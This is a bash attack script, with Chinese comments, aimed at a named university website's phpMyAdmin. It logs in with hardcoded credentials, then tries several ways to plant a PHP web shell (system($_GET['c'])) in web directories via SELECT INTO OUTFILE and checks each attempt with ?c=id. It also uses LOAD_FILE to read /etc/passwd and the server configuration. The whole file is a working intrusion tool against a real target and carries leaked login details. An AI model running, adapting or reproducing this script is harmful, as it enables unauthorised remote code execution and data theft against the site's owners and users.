#!/bin/bash

URL="https://olympic.su.ac.th/phpmyadmin/"
COOKIES="/tmp/pmacookies.txt"

curl -k -s -c "$COOKIES" "$URL" > /dev/null
TOKEN=$(curl -k -s -b "$COOKIES" -c "$COOKIES" -X POST "${URL}index.php" \
  -d "pma_username=mysql&pma_password=Mu123.123.&server=1" -L | \
  grep -oP 'token=\K[^"&]+' | head -1)

echo "[*] Token: $TOKEN"

# 方法1: 创建表插入shell，然后导出
echo "[*] 方法1: 创建表插入shell..."
curl -k -s -b "$COOKIES" "${URL}server_sql.php?db=portal&token=$TOKEN" \
  -d "sql_query=CREATE TABLE IF NOT EXISTS shell(cmd TEXT);" \
  -X POST > /dev/null

curl -k -s -b "$COOKIES" "${URL}server_sql.php?db=portal&token=$TOKEN" \
  -d "sql_query=INSERT INTO shell VALUES('<?php system(\$_GET[\"c\"]); ?>');" \
  -X POST > /dev/null

# 尝试导出到web目录
for path in "/var/www/html" "/var/www" "/usr/share/nginx/html"; do
  echo "[*] 尝试导出到: $path/shell.php"
  curl -k -s -b "$COOKIES" "${URL}server_sql.php?db=portal&token=$TOKEN" \
    -d "sql_query=SELECT cmd FROM shell INTO OUTFILE '$path/shell.php';" \
    -X POST > /dev/null
  
  sleep 1
  TEST=$(curl -k -s "https://olympic.su.ac.th/shell.php?c=id" 2>/dev/null)
  if echo "$TEST" | grep -q "uid="; then
    echo "[+] Shell写入成功: https://olympic.su.ac.th/shell.php?c=id"
    exit 0
  fi
done

# 方法2: 使用exploit数据库
echo "[*] 方法2: 使用exploit数据库..."
curl -k -s -b "$COOKIES" "${URL}server_sql.php?db=exploit&token=$TOKEN" \
  -d "sql_query=CREATE TABLE IF NOT EXISTS s(cmd TEXT);INSERT INTO s VALUES('<?php system(\$_GET[\"c\"]); ?>');SELECT cmd FROM s INTO OUTFILE '/var/www/html/shell.php';" \
  -X POST > /dev/null

sleep 2
TEST=$(curl -k -s "https://olympic.su.ac.th/shell.php?c=id" 2>/dev/null)
if echo "$TEST" | grep -q "uid="; then
  echo "[+] Shell写入成功: https://olympic.su.ac.th/shell.php?c=id"
  exit 0
fi

# 方法3: 尝试通过phpmyadmin目录
echo "[*] 方法3: 写入phpmyadmin目录..."
curl -k -s -b "$COOKIES" "${URL}server_sql.php?db=mysql&token=$TOKEN" \
  -d "sql_query=SELECT '<?php system(\$_GET[\"c\"]); ?>' INTO OUTFILE '/var/www/phpmyadmin/shell.php';" \
  -X POST > /dev/null

sleep 1
TEST=$(curl -k -s "https://olympic.su.ac.th/phpmyadmin/shell.php?c=id" 2>/dev/null)
if echo "$TEST" | grep -q "uid="; then
  echo "[+] Shell写入成功: https://olympic.su.ac.th/phpmyadmin/shell.php?c=id"
  exit 0
fi

# 方法4: 使用LOAD_FILE查找路径，然后写入
echo "[*] 方法4: 查找实际路径..."
RESULT=$(curl -k -s -b "$COOKIES" "${URL}server_sql.php?db=mysql&token=$TOKEN" \
  -d "sql_query=SELECT LOAD_FILE('/etc/passwd');" \
  -X POST | grep -oP 'root:x:[^<]+' | head -1)

if [ ! -z "$RESULT" ]; then
  echo "[+] 可以读取文件，尝试查找web目录..."
  # 尝试读取nginx/apache配置
  curl -k -s -b "$COOKIES" "${URL}server_sql.php?db=mysql&token=$TOKEN" \
    -d "sql_query=SELECT LOAD_FILE('/etc/nginx/sites-enabled/default');" \
    -X POST | grep -i "root\|documentroot" | head -3
fi

echo "[-] 继续尝试其他方法..."
